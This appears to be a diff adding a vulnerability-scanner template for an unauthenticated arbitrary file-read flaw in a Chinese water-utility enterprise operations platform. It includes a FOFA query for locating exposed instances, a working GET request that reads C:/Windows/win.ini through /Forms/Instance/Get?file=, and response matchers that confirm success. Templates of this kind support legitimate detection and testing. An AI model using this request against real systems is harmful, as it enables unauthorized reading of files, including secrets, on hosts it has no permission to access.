@@ -1,0 +1,26 @@
+## id: VEID-2025-0903
+## name: 森鑫炬水务企业综合运营平台 InstanceGet 存在任意文件读取
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2025
+## description: 该系统的一个关键接口 /Forms/Instance/Get?file= 存在任意文件读取漏洞。由于其未对用户访问进行有效的身份验证,导致了未授权访问文件读取
+## fofa-query: title="森鑫炬水务企业综合运营平台 - S8" || (body="Content/easyui.css" && body="重庆森鑫炬科技有限公司")
+## verification: true
+
+
+GET /Forms/Instance/Get?file=C:/Windows/win.ini HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "xml"
+#@ matcher: body contains "[fonts]"
+#@ matcher: body contains "[extensions]"
+
+
+
+
+
+# @VEIL-STAMP: ea27598a26f9272df8775b0dced6840103923d3f1337ef6a6b7c96ea2eb8c0a3
